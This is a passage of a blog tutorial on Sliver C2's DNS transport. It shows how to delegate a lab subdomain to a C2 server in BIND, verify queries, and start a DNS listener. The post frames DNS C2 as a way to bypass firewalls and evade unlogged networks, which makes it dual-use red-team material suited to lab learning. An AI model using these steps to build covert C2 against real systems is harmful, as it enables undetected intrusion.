@@ -1,0 +1,647 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta name="generator" content="Hugo 0.101.0" />
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Learning Sliver C2 (05) - Transports in Detail: DNS | text/plain</title>
+    <meta name="description" content="A post about Sliver&#39;s DNS C2 protocol. I&#39;ll show how to use beacons compiled
+with DNS C2 endpoints and briefly touch upon the kind of traffic they generate.
+In contrast to HTTP C2 traffic though, DNS C2 traffic looks clearly malicious and cannot
+be modified to make it stealthy. Thus, a very quick look shall suffice.
+To enable you to try out DNS C2 in a lab, there is also some info DNS server configuration.
+">
+    <meta name="keywords" content="c2, sliver, tutorial, dns">
+    
+    
+    
+    
+    
+
+  <meta name="author" content="Dominic Breuker">
+
+
+    <meta property="og:title" content="Learning Sliver C2 (05) - Transports in Detail: DNS" />
+<meta property="og:description" content="A post about Sliver&#39;s DNS C2 protocol. I&#39;ll show how to use beacons compiled
+with DNS C2 endpoints and briefly touch upon the kind of traffic they generate.
+In contrast to HTTP C2 traffic though, DNS C2 traffic looks clearly malicious and cannot
+be modified to make it stealthy. Thus, a very quick look shall suffice.
+To enable you to try out DNS C2 in a lab, there is also some info DNS server configuration.
+" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://dominicbreuker.com/post/learning_sliver_c2_05_transports_in_detail_dns/" /><meta property="og:image" content="https://dominicbreuker.com/img/avatar.png"/><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2022-09-23T00:00:00+00:00" />
+<meta property="article:modified_time" content="2022-09-23T00:00:00+00:00" />
+
+
+    
+
+
+
+  <meta property="og:image" content="img/avatar.png">
+
+
+    <meta name="theme-color" content="#000">
+
+    
+    
+    
+    
+    <link rel="canonical" href="https://dominicbreuker.com/post/learning_sliver_c2_05_transports_in_detail_dns/">
+    
+    
+    <link rel="icon" sizes="any" href="data:image/svg+xml,%3Csvg%20viewBox='0%200%2046%2045'%20xmlns='http://www.w3.org/2000/svg'%3E%3Ctitle%3EAfter%20Dark%3C/title%3E%3Cpath%20d='M.708%2045L23%20.416%2045.292%2045H.708zM35%2038L23%2019%2011%2038h24z'%20fill='%23000'/%3E%3C/svg%3E">
+
+    <style>
+  html{font-size:12px}*{box-sizing:border-box;text-rendering:geometricPrecision}body{font-size:1rem;line-height:1.5rem;margin:0;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif;word-wrap:break-word}h1,h2,h3,h4,h5,h6{line-height:1.3em}fieldset{border:none;padding:0;margin:0}pre{padding:2rem;margin:1.75rem 0;background-color:#fff;border:1px solid #ccc;overflow:auto}code[class*=language-],pre[class*=language-],pre code{font-weight:100;text-shadow:none;margin:1.75rem 0}a{cursor:pointer;color:#ff2e88;text-decoration:none;border-bottom:1px solid #ff2e88}a:hover{background-color:#ff2e88;color:#fff}.grid{display:-ms-flexbox;display:flex;-ms-flex-wrap:wrap;flex-wrap:wrap}.grid.\-top{-ms-flex-align:start;-ms-grid-row-align:flex-start;align-items:flex-start}.grid.\-middle{-ms-flex-align:center;-ms-grid-row-align:center;align-items:center}.grid.\-bottom{-ms-flex-align:end;-ms-grid-row-align:flex-end;align-items:flex-end}.grid.\-stretch{-ms-flex-align:stretch;-ms-grid-row-align:stretch;align-items:stretch}.grid.\-baseline{-ms-flex-align:baseline;-ms-grid-row-align:baseline;align-items:baseline}.grid.\-left{-ms-flex-pack:start;justify-content:flex-start}.grid.\-center{-ms-flex-pack:center;justify-content:center}.grid.\-right{-ms-flex-pack:end;justify-content:flex-end}.grid.\-between{-ms-flex-pack:justify;justify-content:space-between}.grid.\-around{-ms-flex-pack:distribute;justify-content:space-around}.cell{-ms-flex:1;flex:1;box-sizing:border-box}@media screen and (min-width:768px){.cell.\-1of12{-ms-flex:0 0 8.33333%;flex:0 0 8.33333%}.cell.\-2of12{-ms-flex:0 0 16.66667%;flex:0 0 16.66667%}.cell.\-3of12{-ms-flex:0 0 25%;flex:0 0 25%}.cell.\-4of12{-ms-flex:0 0 33.33333%;flex:0 0 33.33333%}.cell.\-5of12{-ms-flex:0 0 41.66667%;flex:0 0 41.66667%}.cell.\-6of12{-ms-flex:0 0 50%;flex:0 0 50%}.cell.\-7of12{-ms-flex:0 0 58.33333%;flex:0 0 58.33333%}.cell.\-8of12{-ms-flex:0 0 66.66667%;flex:0 0 66.66667%}.cell.\-9of12{-ms-flex:0 0 75%;flex:0 0 75%}.cell.\-10of12{-ms-flex:0 0 83.33333%;flex:0 0 83.33333%}.cell.\-11of12{-ms-flex:0 0 91.66667%;flex:0 0 91.66667%}}@media screen and (max-width:768px){.grid{-ms-flex-direction:column;flex-direction:column}.cell{-ms-flex:0 0 auto;flex:0 0 auto}}.hack,.hack blockquote,.hack code,.hack em,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack strong{font-size:1rem;font-style:normal;font-family:Menlo,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New,monospace,serif}.hack blockquote,.hack code,.hack em,.hack strong{line-height:20px}.hack blockquote,.hack code,.hack footer,.hack h1,.hack h2,.hack h3,.hack h4,.hack h5,.hack h6,.hack header,.hack li,.hack ol,.hack p,.hack section,.hack ul{float:none;margin:0;padding:0}.hack blockquote,.hack h1,.hack ol,.hack p,.hack ul{margin-top:20px;margin-bottom:20px}.hack h1{position:relative;display:inline-block;display:table-cell;padding:20px 0 30px;margin:0;overflow:hidden}.hack h1:after{content:"====================================================================================================";position:absolute;bottom:10px;left:0}.hack h1+*{margin-top:0}.hack h2,.hack h3,.hack h4,.hack h5,.hack h6{position:relative;margin-bottom:1.75rem}.hack h2:before,.hack h3:before,.hack h4:before,.hack h5:before,.hack h6:before{display:inline}.hack h2:before{content:"## "}.hack h3:before{content:"### "}.hack h4:before{content:"#### "}.hack h5:before{content:"##### "}.hack h6:before{content:"###### "}.hack li{position:relative;display:block;padding-left:20px}.hack li:after{position:absolute;top:0;left:0}.hack ul>li:after{content:"-"}.hack ol{counter-reset:a}.hack ol>li:after{content:counter(a) ".";counter-increment:a}.hack blockquote{position:relative;padding-left:17px;padding-left:2ch;overflow:hidden}.hack blockquote:after{content:">\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>\A>";white-space:pre;position:absolute;top:0;left:0;line-height:20px}.hack em:after,.hack em:before{content:"*";display:inline}.hack pre code:after,.hack pre code:before{content:''}.hack code{font-weight:700}.hack code:after,.hack code:before{content:"`";display:inline}.hack hr{position:relative;height:20px;overflow:hidden;border:0;margin:20px 0}.hack hr:after{content:"----------------------------------------------------------------------------------------------------";position:absolute;top:0;left:0;line-height:20px;width:100%;word-wrap:break-word}@-moz-document url-prefix(){.hack h1{display:block}}.hack-ones ol>li:after{content:"1."}p{margin:0 0 1.75rem}.container{max-width:70rem}.container,.container-fluid{margin:0 auto;padding:0 1rem}.inner{padding:1rem}.inner2x{padding:2rem}.pull-left{float:left}.pull-right{float:right}.progress-bar{height:8px;opacity:.8;background-color:#ccc;margin-top:12px}.progress-bar.progress-bar-show-percent{margin-top:38px}.progress-bar-filled{background-color:gray;height:100%;transition:width .3s ease;position:relative;width:0}.progress-bar-filled:before{content:'';border:6px solid transparent;border-top-color:gray;position:absolute;top:-12px;right:-6px}.progress-bar-filled:after{color:gray;content:attr(data-filled);display:block;font-size:12px;white-space:nowrap;position:absolute;border:6px solid transparent;top:-38px;right:0;-ms-transform:translateX(50%);transform:translateX(50%)}table{width:100%;border-collapse:collapse;margin:1.75rem 0;color:#778087}table td,table th{vertical-align:top;border:1px solid #ccc;line-height:15px;padding:10px}table thead th{font-size:10px}table tbody td:first-child{font-weight:700;color:#333}.form{width:30rem}.form-group{margin-bottom:1.75rem;overflow:auto}.form-group label{border-bottom:2px solid #ccc;color:#333;width:10rem;display:inline-block;height:38px;line-height:38px;padding:0;float:left;position:relative}.form-group.form-success label{color:#4caf50!important;border-color:#4caf50!important}.form-group.form-warning label{color:#ff9800!important;border-color:#ff9800!important}.form-group.form-error label{color:#f44336!important;border-color:#f44336!important}.form-control{outline:none;border:none;border-bottom:2px solid #ccc;padding:.5rem 0;width:20rem;height:38px;background-color:transparent}.form-control:focus{border-color:#555}.form-group.form-textarea label:after{position:absolute;content:'';width:2px;background-color:#fff;right:-2px;top:0;bottom:0}textarea.form-control{height:auto;resize:none;padding:1rem 0;border-bottom:2px solid #ccc;border-left:2px solid #ccc;padding:.5rem}select.form-control{border-radius:0;background-color:transparent;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none}.help-block{color:#999;margin-top:.5rem}.form-actions{margin-bottom:1.75rem}.btn{display:-ms-inline-flexbox;display:inline-flex;-ms-flex-align:center;align-items:center;-ms-flex-pack:center;justify-content:center;cursor:pointer;outline:none;padding:.65rem 2rem;font-size:1rem;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;z-index:1}.btn:active{box-shadow:inset 0 1px 3px rgba(0,0,0,.12)}.btn.btn-ghost{border-color:#757575;color:#757575;background-color:transparent}.btn.btn-ghost:focus,.btn.btn-ghost:hover{border-color:#424242;color:#424242;z-index:2}.btn.btn-ghost:hover{background-color:transparent}.btn-block{width:100%;display:-ms-flexbox;display:flex}.btn-default{color:#fff;background-color:#e0e0e0;border:1px solid #e0e0e0;color:#333}.btn-default:focus:not(.btn-ghost),.btn-default:hover{background-color:#dcdcdc;border-color:#dcdcdc}.btn-success{color:#fff;background-color:#4caf50;border:1px solid #4caf50}.btn-success:focus:not(.btn-ghost),.btn-success:hover{background-color:#43a047;border-color:#43a047}.btn-success.btn-ghost{border-color:#4caf50;color:#4caf50}.btn-success.btn-ghost:focus,.btn-success.btn-ghost:hover{border-color:#388e3c;color:#388e3c;z-index:2}.btn-error{color:#fff;background-color:#f44336;border:1px solid #f44336}.btn-error:focus:not(.btn-ghost),.btn-error:hover{background-color:#e53935;border-color:#e53935}.btn-error.btn-ghost{border-color:#f44336;color:#f44336}.btn-error.btn-ghost:focus,.btn-error.btn-ghost:hover{border-color:#d32f2f;color:#d32f2f;z-index:2}.btn-warning{color:#fff;background-color:#ff9800;border:1px solid #ff9800}.btn-warning:focus:not(.btn-ghost),.btn-warning:hover{background-color:#fb8c00;border-color:#fb8c00}.btn-warning.btn-ghost{border-color:#ff9800;color:#ff9800}.btn-warning.btn-ghost:focus,.btn-warning.btn-ghost:hover{border-color:#f57c00;color:#f57c00;z-index:2}.btn-info{color:#fff;background-color:#00bcd4;border:1px solid #00bcd4}.btn-info:focus:not(.btn-ghost),.btn-info:hover{background-color:#00acc1;border-color:#00acc1}.btn-info.btn-ghost{border-color:#00bcd4;color:#00bcd4}.btn-info.btn-ghost:focus,.btn-info.btn-ghost:hover{border-color:#0097a7;color:#0097a7;z-index:2}.btn-primary{color:#fff;background-color:#2196f3;border:1px solid #2196f3}.btn-primary:focus:not(.btn-ghost),.btn-primary:hover{background-color:#1e88e5;border-color:#1e88e5}.btn-primary.btn-ghost{border-color:#2196f3;color:#2196f3}.btn-primary.btn-ghost:focus,.btn-primary.btn-ghost:hover{border-color:#1976d2;color:#1976d2;z-index:2}.btn-group{overflow:auto}.btn-group .btn{float:left}.btn-group .btn-ghost:not(:first-child){margin-left:-1px}.card{border:1px solid #ccc}.card .card-header{color:#333;text-align:center;background-color:#ddd;padding:.5rem 0}.alert{color:#ccc;padding:1rem;border:1px solid #ccc;margin-bottom:1.75rem}.alert-success{color:#4caf50;border-color:#4caf50}.alert-error{color:#f44336;border-color:#f44336}.alert-info{color:#00bcd4;border-color:#00bcd4}.alert-warning{color:#ff9800;border-color:#ff9800}.media:not(:last-child){margin-bottom:1.25rem}.media-left{padding-right:1rem}.media-left,.media-right{display:table-cell;vertical-align:top}.media-right{padding-left:1rem}.media-body{display:table-cell;vertical-align:top}.media-heading{font-size:1.16667rem;font-weight:700}.media-content{margin-top:.3rem}.avatarholder,.placeholder{background-color:#f0f0f0;text-align:center;color:#b9b9b9;font-size:1rem;border:1px solid #f0f0f0}.avatarholder{width:48px;height:48px;line-height:46px;font-size:2rem;background-size:cover;background-position:50%;background-repeat:no-repeat}.avatarholder.rounded{border-radius:33px}.loading{display:inline-block;content:'&nbsp;';height:20px;width:20px;margin:0 .5rem;animation:a .6s infinite linear;border:2px solid #e91e63;border-right-color:transparent;border-radius:50%}.btn .loading{margin-bottom:0;width:14px;height:14px}.btn div.loading{float:left}.alert .loading{margin-bottom:-5px}@keyframes a{0%{transform:rotate(0deg)}to{transform:rotate(1turn)}}.menu{width:100%}.menu .menu-item{display:block;color:#616161;border-color:#616161}.menu .menu-item.active,.menu .menu-item:hover{color:#000;border-color:#000;background-color:transparent}@media screen and (max-width:768px){.form-group label{display:block;border-bottom:none;width:100%}.form-group.form-textarea label:after{display:none}.form-control{width:100%}textarea.form-control{border-left:none;padding:.5rem 0}pre::-webkit-scrollbar{height:3px}}@media screen and (max-width:480px){.form{width:100%}}.dark{color:#ccc}.dark,.dark pre{background-color:#000}.dark pre{padding:0;border:none}.dark pre code{color:#00bcd4}.dark h1 a,.dark h2 a,.dark h3 a,.dark h4 a,.dark h5 a{color:#ccc}.dark code,.dark strong{color:#fff}.dark code{font-weight:100}.dark table{color:#ccc}.dark table td,.dark table th{border-color:#444}.dark table tbody td:first-child{color:#fff}.dark .form-group label{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-group.form-textarea label:after{background-color:#000}.dark .form-control{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .form-control:focus{border-color:#ccc;color:#ccc}.dark textarea.form-control{color:#ccc}.dark .card{border-color:rgba(95,95,95,.78)}.dark .card .card-header{background-color:transparent;color:#ccc;border-bottom:1px solid rgba(95,95,95,.78)}.dark .btn.btn-ghost.btn-default{border-color:#ababab;color:#ababab}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#9c9c9c;color:#9c9c9c;z-index:1}.dark .btn.btn-ghost.btn-default:focus,.dark .btn.btn-ghost.btn-default:hover{border-color:#e0e0e0;color:#e0e0e0}.dark .btn.btn-ghost.btn-primary:focus,.dark .btn.btn-ghost.btn-primary:hover{border-color:#64b5f6;color:#64b5f6}.dark .btn.btn-ghost.btn-success:focus,.dark .btn.btn-ghost.btn-success:hover{border-color:#81c784;color:#81c784}.dark .btn.btn-ghost.btn-info:focus,.dark .btn.btn-ghost.btn-info:hover{border-color:#4dd0e1;color:#4dd0e1}.dark .btn.btn-ghost.btn-error:focus,.dark .btn.btn-ghost.btn-error:hover{border-color:#e57373;color:#e57373}.dark .btn.btn-ghost.btn-warning:focus,.dark .btn.btn-ghost.btn-warning:hover{border-color:#ffb74d;color:#ffb74d}.dark .avatarholder,.dark .placeholder{background-color:transparent;border-color:#333}.dark .menu .menu-item{color:#ccc;border-color:rgba(95,95,95,.78)}.dark .menu .menu-item.active,.dark .menu .menu-item:hover{color:#fff;border-color:#ccc}
+  :root {
+  --screen-size-small: 30em; /* breakpoint reference only */
+}
+@keyframes intro {
+  0% {
+    opacity: 0;
+  }
+  100% {
+    opacity: 1;
+  }
+}
+.muted {
+  color: rgba(255, 255, 255, 0.5);
+}
+.readmore {
+  margin-bottom: 2.2em;
+}
+.responsive-iframe {
+  position: relative;
+  padding-bottom: 56.25%; /* 16:9 */
+  padding-top: 25px;
+  height: 0;
+}
+.responsive-iframe iframe {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+}
+iframe {
+  border: 0;
+}
+main, footer {
+  animation: intro 0.3s both;
+  animation-delay: 0.15s;
+}
+footer time[datetime$="M"]:before {
+  content: "\2013\0020";
+}
+@media only screen
+  and ( max-width: 30em ) {
+  footer time[datetime$="M"] {
+    display: none;
+  }
+}
+blockquote cite {
+  display: block;
+}
+blockquote cite::before {
+   content: "\2014";
+}
+:target {
+  color: #fff;
+}
+/* hack.css overrides and enhancements */
+.hack li ul {
+  margin: 0;
+}
+.main {
+  padding: 20px 10px;
+}
+nav a.active {
+  background-color: #ff2e88;
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #ff9800;
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+}
+a[href*="://"]::after,
+a[rel*="external"] {
+  content: " " url("data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20class='i-external'%20viewBox='0%200%2032%2032'%20width='14'%20height='14'%20fill='none'%20stroke='%23ff9800'%20stroke-linecap='round'%20stroke-linejoin='round'%20stroke-width='9.38%'%3E%3Cpath%20d='M14%209%20L3%209%203%2029%2023%2029%2023%2018%20M18%204%20L28%204%2028%2014%20M28%204%20L14%2018'/%3E%3C/svg%3E");
+}
+figure a[href*="://"]::after,
+figure a[rel*="external"] {
+  content: "";
+}
+html {
+  font-size: 13px;
+}
+.hack pre {
+  font-size: 17px;
+}
+article [itemprop="description"] {
+  margin-bottom: 20px;
+  margin-top: 20px;
+}
+@media screen and (min-width: 768px) {
+  html {
+    font-size: 1em;
+  }
+  .container {
+    max-width: 50rem;
+  }
+}
+
+  nav a.active {
+  background-color: #33cc33; /*ff2e88*/
+  color: #fff;
+}
+a[itemprop="url"] {
+  color: #339933; /*ff9800*/
+}
+a[itemprop="url"]:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+.dark pre code {
+  color: #248f24;
+}
+
+.dark code {
+  color: #248f24;
+}
+
+a {
+  color: #339933; /*ff9800*/
+  border-bottom: 1px solid #33cc33;
+}
+
+a:hover {
+  color: #fff;
+  background-color: #33cc33; /*ff2e88*/
+}
+
+/* custom styles */
+figure {
+  margin-left: auto;
+  margin-right: auto;
+  text-align: center;
+}
+figure img {
+  max-width: 100%;
+}
+figure a {
+  border-bottom: none !important;
+}
+figure a:hover {
+  background-color: inherit !important;
+}
+
+</style>
+
+    
+    
+      <script async src="/js/lazysizes.min.js"></script>
+    
+    
+      <script async src="/js/bpgdec8a.js"></script>
+      <script async src="/js/bpgdec8.js"></script>
+      <script async src="/js/bpgdec.js"></script>
+    
+  </head>
+  
+  <body class="hack dark main container">
+    <header>
+  
+  <nav itemscope itemtype="http://schema.org/SiteNavigationElement">
+    
+    
+      <a itemprop="url" class="" href="/"><span itemprop="name">Home</span></a>
+    
+      <a itemprop="url" class="" href="/post/"><span itemprop="name">Post</span></a>
+    
+      <a itemprop="url" class="" href="/about/"><span itemprop="name">About</span></a>
+    
+  </nav>
+
+
+</header>
+    <main>
+  <article itemscope itemtype="http://schema.org/BlogPosting">
+    <meta itemprop="name" content="Learning Sliver C2 (05) - Transports in Detail: DNS">
+<meta itemprop="description" content="A post about Sliver&#39;s DNS C2 protocol. I&#39;ll show how to use beacons compiled
+with DNS C2 endpoints and briefly touch upon the kind of traffic they generate.
+In contrast to HTTP C2 traffic though, DNS C2 traffic looks clearly malicious and cannot
+be modified to make it stealthy. Thus, a very quick look shall suffice.
+To enable you to try out DNS C2 in a lab, there is also some info DNS server configuration.
+"><meta itemprop="datePublished" content="2022-09-23T00:00:00+00:00" />
+<meta itemprop="dateModified" content="2022-09-23T00:00:00+00:00" />
+<meta itemprop="wordCount" content="1793"><meta itemprop="image" content="https://dominicbreuker.com/img/avatar.png"/>
+<meta itemprop="keywords" content="c2,sliver,tutorial,dns," />
+    <script async src="/js/baffle.js"></script>
+    <header>
+      <h1 class="baffle" itemprop="headline">Learning Sliver C2 (05) - Transports in Detail: DNS</h1>
+      <p class="muted">
+        <svg style="margin-bottom:-3px" class="i-clock" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <circle cx="16" cy="16" r="14" />
+  <path d="M16 8 L16 16 20 20" />
+</svg>
+<span>9 minute read</span>
+<svg style="margin-bottom: -3px" class="i-edit" viewBox="0 0 32 32" width="16" height="16" fill="none" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="6.25%">
+  <path d="M30 7 L25 2 5 22 3 29 10 27 Z M21 6 L26 11 Z M5 22 L10 27 Z" />
+</svg>
+
+  Published: <time datetime="2022-09-23T00:00:00&#43;00:00">23 Sep, 2022</time>
+
+
+      </p>
+    </header>
+    
+      <blockquote itemprop="description">A post about Sliver&#39;s DNS C2 protocol. I&#39;ll show how to use beacons compiled
+with DNS C2 endpoints and briefly touch upon the kind of traffic they generate.
+In contrast to HTTP C2 traffic though, DNS C2 traffic looks clearly malicious and cannot
+be modified to make it stealthy. Thus, a very quick look shall suffice.
+To enable you to try out DNS C2 in a lab, there is also some info DNS server configuration.
+</blockquote>
+    
+    
+  <details>
+    <summary>Table of Contents</summary>
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduction">Introduction</a></li>
+    <li><a href="#preparations">Preparations</a>
+      <ul>
+        <li><a href="#prepare-dns-server">Prepare DNS server</a></li>
+      </ul>
+    </li>
+    <li><a href="#getting-a-beacon-via-dns">Getting a beacon via DNS</a></li>
+    <li><a href="#sessions-and-dns-c2">Sessions and DNS C2</a></li>
+  </ul>
+</nav>
+  </details>
+  <script>
+    const el = document.querySelector('details summary')
+    el.onclick = () => {
+      (function(l,o,a,d,e,r){e=o.createElement(a),r=o.getElementsByTagName(a)[0];e.async=1;e.src=d;r.parentNode.insertBefore(e,r)})(window,document,'script','/js/smoothscroll.js');
+      el.onclick = null
+    }
+    document.querySelectorAll('#TableOfContents a').forEach(link => {
+      link.addEventListener('click', () => {
+        document.querySelector(
+          link.href.slice(link.href.indexOf('#'))
+        ).scrollIntoView({ behavior: 'smooth' })
+      })
+    })
+  </script>
+
+
+    <div itemprop="articleBody">
+      <h1 id="sliver-c2">Sliver C2</h1>
+<p>This post is part of a tutorial blog post series on Sliver C2.
+For an overview: <a href="../../post/learning_sliver_c2_01_installation/">click here</a>.</p>
+<h2 id="introduction">Introduction</h2>
+<p>In very restricted environments, your target machine may be unable to establish
+connections to the Internet directly. The previous post
+<a href="../../post/learning_sliver_c2_04_transports_in_detail_http_and_https/">04 - Transports in Detail: HTTP and HTTPS</a>
+was about Sliver&rsquo;s HTTP-based C2 protocols, which may allow to get a C2 callback nevertheless
+if the target can send HTTP requests out via a proxy.
+A second option in such cases is the DNS C2 protocol, which encodes all data exchanged between
+the target and the C2 server in DNS requests and responses.
+The only requirement is that the target can resolve DNS names
+(usually via some DNS server in the internal network).</p>
+<p>Apart from the ability to bypass firewall restrictions,
+DNS C2 can be very stealthy. Even though Sliver&rsquo;s DNS tunneling implementation
+is <a href="https://github.com/BishopFox/sliver/wiki/DNS-C2">not designed for stealth</a>,
+DNS C2 may still go unnoticed if the operators of the environment do not log
+DNS queries, or if they don&rsquo;t have dedicated alerting on their logs.</p>
+<p>To use DNS C2, your Sliver server must be configured as the authoritative name server
+for a certain domain. In posts
+<a href="../../post/learning_sliver_c2_01_installation/">1</a>,
+<a href="../../post/learning_sliver_c2_02_beacons_and_sessions/">2</a>,
+<a href="../../post/learning_sliver_c2_03_transports_in_detail_mtls_and_wg/">3</a> and
+<a href="../../post/learning_sliver_c2_04_transports_in_detail_http_and_https/">4</a>
+of this series you can find some notes on how to set up the lab environment
+I use to experiment with Sliver. Starting from the outcome of that (which includes a DNS server),
+I&rsquo;ll describe below how to change the DNS server configuration to make <code>dnsc2.labnet.local</code> a
+domain usable for DNS C2.</p>
+<p>After that, I&rsquo;ll demo the use of a DNS beacon and show some traffic logs.
+I&rsquo;ll discuss a few observations as well.</p>
+<h2 id="preparations">Preparations</h2>
+<p>All that is to do is a small change to the DNS zone file for <code>labnet.local</code>,
+stored on the Linux VM running the BIND / named DNS service.
+You have to add an NS record delegating the subdomain <code>dnsc2.labnet.local</code>
+to the Sliver C2 server. Sliver can take it from there.</p>
+<p>The setup for this post will then be as seen below.
+You can build a Sliver implant binary on the C2 server,
+host it with Apache there,
+download it to the target machine (via Squid on the proxy server),
+then run the implant and establish a C2 connection.</p>
+<pre tabindex="0"><code> ┌───────────────────┐                              ┌───────────────────┐
+ │                   │            Resolve DNS / C2  │                   │
+ │   Proxy Server    ├──UDP-53 ◄────────────────────┤      Target       │
+ │      (Linux)      │                              │     (Windows)     │
+ │                   │               Proxy connect  │                   │
+ │  192.168.122.185  ├──TCP-3128 ◄──────────────────┤  192.168.122.32   │
+ │                   │                              │                   │
+ └───┬──────────┬────┘                              └───────────────────┘
+     │          │   
+     │          │ Download
+     │          │ binaries
+     │ C2       │ 
+     ▼          ▼     
+   UDP-53    TCP-8080  
+ ┌───+──────────+────┐
+ │                   │
+ │     C2 Server     │
+ │      (Linux)      │
+ │                   │
+ │  192.168.122.111  │
+ │                   │
+ └───────────────────┘
+</code></pre><p>Note that the target host above is still able to establish HTTP connections to the Sliver server
+via the proxy (which was the scenario of the previous post).
+This is not required for DNS C2, but I left it on since my way of transferring the Sliver implant binaries
+from the C2 server to the target machine was via web download.</p>
+<h3 id="prepare-dns-server">Prepare DNS server</h3>
+<p>The first step is to ensure BIND will attempt to recursively resolve our lab domain names itself
+rather than asking upstream DNS servers for an answer.
+In the main configuration file <code>/etc/bind/named.conf.options</code>, a block <code>forwarders { ... }</code> contains
+public DNS servers to forward requests to by default (see post about
+<a href="../../post/learning_sliver_c2_03_transports_in_detail_mtls_and_wg/">beacons and sessions</a>).
+Override this setting for <code>labnet.local</code> in <code>/etc/bind/named.conf.local</code>.
+This is a snippet with the config (<a href="../../files/28/etc_bind_named.conf.local">click here for complete file</a>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>zone &#34;labnet.local&#34; {
+</span></span><span style="display:flex;"><span>    type master;
+</span></span><span style="display:flex;"><span>    file &#34;/etc/bind/zones/db.labnet.local&#34;;   # zone file path
+</span></span><span style="display:flex;"><span>    forwarders {};
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>Now you have to delegate a subdomain of <code>labnet.local</code> to the C2 server,
+so that all requests related to it can be handled by the C2 server.
+In the zone file itself, located at <code>/etc/bind/zones/db.labnet.local</code>
+add a new NS record to the bottom to create a subdomain usable with DNS C2.
+The following record specifies that <code>dnsc2.labnet.local</code> shall be managed
+by the C2 server (<a href="../../files/28/etc_bind_zones_db.labnet.local">click for complete file</a>):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>; delegate subdomain
+</span></span><span style="display:flex;"><span>dnsc2.labnet.local.     360     IN      NS      sliver.labnet.local.
+</span></span></code></pre></div><p>Now restart DNS with <code>systemctl restart named.service</code>
+and ensure the Windows target still has the proxy host configured as DNS server.</p>
+<p>To verify that the setup works, run the following on your lab hosts:</p>
+<ul>
+<li>C2 server: <code>tcpdump -ni any udp and port 53</code> to capture incoming DNS requests</li>
+<li>Proxy host: <code>tail -f /var/log/bind/query</code> to view the DNS query log</li>
+<li>Windows target: <code>nslookup.exe prefix.dnsc2.labnet.local</code> to create a DNS query.</li>
+</ul>
+<p>If the setup works, you should see the DNS request in the tcpdump logs on the C2 server.
+It should look roughly like this:</p>
+<pre tabindex="0"><code>┌──(kali㉿kali)-[~]
+└─$ sudo tcpdump -ni any udp and port 53
+tcpdump: data link type LINUX_SLL2
+tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+listening on any, link-type LINUX_SLL2 (Linux cooked v2), snapshot length 262144 bytes
+21:39:54.878522 eth0  In  IP 192.168.122.185.48101 &gt; 192.168.122.111.53: 63630 [1au] A? prefix.dnsc2.labnet.local. (66)
+21:39:54.879546 eth0  In  IP 192.168.122.185.34297 &gt; 192.168.122.111.53: 61474 [1au] AAAA? prefix.dnsc2.labnet.local. (66)
+</code></pre><p>Moreover, there should be corresponding entries in the DNS query logs.
+Of course, the Windows target will not return a result for the DNS query since
+the C2 server was not yet configured to respond.</p>
+<h2 id="getting-a-beacon-via-dns">Getting a beacon via DNS</h2>
+<p>As usual, you need a listener for incoming C2 connections.
+For other C2 protocols, it&rsquo;s usually enough to start them
+without any arguments. For DNS however, you have to specify the
+domain Sliver should listen on. Pass it as an argument to the <code>dns</code>
+command in your Sliver console after connecting to the C2 server:</p>
+<pre tabindex="0"><code>sliver &gt; dns -d dnsc2.labnet.local.
+
+[*] Starting DNS listener with parent domain(s) [dnsc2.labnet.local.] ...
+
+[*] Successfully started job #1
+
+sliver &gt; jobs
+
+ ID   Name   Protocol   Port 
+==== ====== ========== ======
+ 1    dns    udp        53
+</code></pre><p>Note that I&rsquo;ve put a <code>.</code> at the end of the domain.
+The Sliver developers <a href="https://github.com/BishopFox/sliver/issues/873#issuecomment-1248322191">never miss an opportunity</a>
+to recommend using the fully qualified domain name (FQDN)
+(see also the <a href="https://github.com/BishopFox/sliver/wiki/DNS-C2">wiki</a>).
+For me it also worked without since Sliver seemed clever enough to append it for me,
+but you never know. Just append it and be on the safe side.</p>
+<p>Now generate a beacon:</p>
